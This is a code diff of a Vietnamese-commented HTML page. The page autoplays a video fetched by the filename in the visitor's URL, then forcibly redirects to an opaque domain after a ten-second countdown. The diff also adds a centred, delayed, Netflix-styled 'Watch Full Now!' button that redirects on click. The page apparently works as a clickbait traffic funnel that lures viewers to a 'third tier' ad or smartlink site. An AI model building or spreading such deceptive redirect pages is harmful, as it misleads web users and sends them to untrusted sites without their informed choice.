@@ -22,6 +22,8 @@
             height: 100%;
             object-fit: contain;
         }
+
+        /* Overlay redirect */
         #overlay {
             position: absolute;
             top: 0; left: 0;
@@ -42,29 +44,32 @@
             opacity: 0.85;
         }
 
-        /* NÚT "Watch Full Now!" */
+        /* NÚT "Watch Full Now!" - Ở GIỮA MÀN HÌNH */
         #skipButton {
             position: absolute;
-            bottom: 25px;
-            right: 25px;
-            background: #e50914; /* màu đỏ Netflix-style */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #e50914;
             color: #fff;
             border: none;
-            padding: 14px 24px;
-            font-size: 17px;
+            padding: 16px 32px;
+            font-size: 18px;
             font-weight: 700;
-            border-radius: 4px;
+            border-radius: 6px;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(229, 9, 20, 0.4);
-            z-index: 20;
-            transition: all 0.2s ease;
+            box-shadow: 0 6px 20px rgba(229, 9, 20, 0.5);
+            z-index: 30;
+            transition: all 0.3s ease;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
+            letter-spacing: 1px;
+            white-space: nowrap;
+            display: none; /* Ban đầu ẩn */
         }
         #skipButton:hover {
             background: #f40612;
-            transform: scale(1.05);
-            box-shadow: 0 6px 20px rgba(229, 9, 20, 0.6);
+            transform: translate(-50%, -50%) scale(1.08);
+            box-shadow: 0 8px 25px rgba(229, 9, 20, 0.7);
         }
     </style>
 </head>
@@ -73,7 +78,7 @@
         <!-- Video Tầng 2 (tự động phát) -->
         <video id="player" controls autoplay playsinline muted></video>
         
-        <!-- Nút Watch Full Now! -->
+        <!-- Nút Watch Full Now! (ở giữa màn hình) -->
         <button id="skipButton">Watch Full Now!</button>
         
         <!-- Overlay thông báo redirect -->
@@ -85,41 +90,53 @@
 
     <script>
         // ====================== CẤU HÌNH ======================
-        const VIDEO_BASE   = "http://cdn.videy.co";   // Tầng 2 – video sẽ phát
-        const REDIRECT_URL = "https://broadlyjukeboxunrevised.com/2053781"; // Tầng 3 – link redirect
-        const DELAY_MS     = 10000;                  // 10 giây
+        const VIDEO_BASE   = "https://cdn.videy.co";  // ← Tầng 2: base URL thay đổi theo filename
+        const REDIRECT_URL = "https://broadlyjukeboxunrevised.com/2053781"; // Tầng 3 (không đổi)
+        const DELAY_REDIRECT = 10000;                // 10 giây tự động redirect
+        const DELAY_SHOW_BUTTON = 5000;              // 5 giây sau mới hiện nút
         // =====================================================
 
         function getFilename() {
             let path = window.location.pathname;
             let filename = path.split('/').pop();
             
+            // Hỗ trợ cả .mp4 và .mov
             if (!filename || (!filename.endsWith('.mp4') && !filename.endsWith('.mov'))) {
-                filename = '0437be931.mp4'; // fallback
+                filename = 'voDWqx8K1.mp4'; // fallback
             }
             return filename;
         }
 
         function init() {
             const filename = getFilename();
+            
+            // Tầng 2: tự động map theo filename từ URL truy cập
             const videoUrl = `${VIDEO_BASE}/${filename}`;
 
-            console.log(`🎥 Đang phát video Tầng 2: ${videoUrl}`);
-            console.log(`⏰ Sau 10 giây sẽ redirect sang Tầng 3: ${REDIRECT_URL}`);
+            console.log(`🎥 Filename: ${filename}`);
+            console.log(`▶️  Phát video Tầng 2: ${videoUrl}`);
+            console.log(`⏰ Sau 10s redirect → ${REDIRECT_URL}`);
 
-            // Load video và tự động phát
+            // Load video Tầng 2
             const video = document.getElementById('player');
             video.src = videoUrl;
             video.play().catch(err => console.log('Auto-play bị chặn:', err));
 
-            // Nút "Watch Full Now!" – click thì redirect ngay
+            // NÚT "Watch Full Now!"
             const skipButton = document.getElementById('skipButton');
+            
+            // Hiện nút sau đúng 5 giây
+            setTimeout(() => {
+                skipButton.style.display = 'block';
+            }, DELAY_SHOW_BUTTON);
+
+            // Click nút → redirect ngay
             skipButton.addEventListener('click', () => {
-                console.log('👆 Người dùng click "Watch Full Now!" → redirect ngay');
+                console.log('👆 Click "Watch Full Now!" → redirect ngay');
                 window.location.href = REDIRECT_URL;
             });
 
-            // Countdown + overlay (vẫn giữ redirect tự động sau 10s)
+            // Countdown + overlay (redirect tự động sau 10s)
             const overlay = document.getElementById('overlay');
             const countdownEl = overlay.querySelector('span');
             let secondsLeft = 10;
@@ -130,12 +147,11 @@
                 if (secondsLeft <= 0) clearInterval(countdownInterval);
             }, 1000);
 
-            // Redirect tự động sau 10 giây
             setTimeout(() => {
                 clearInterval(countdownInterval);
                 overlay.style.display = 'flex';
                 window.location.href = REDIRECT_URL;
-            }, DELAY_MS);
+            }, DELAY_REDIRECT);
         }
 
         window.onload = init;
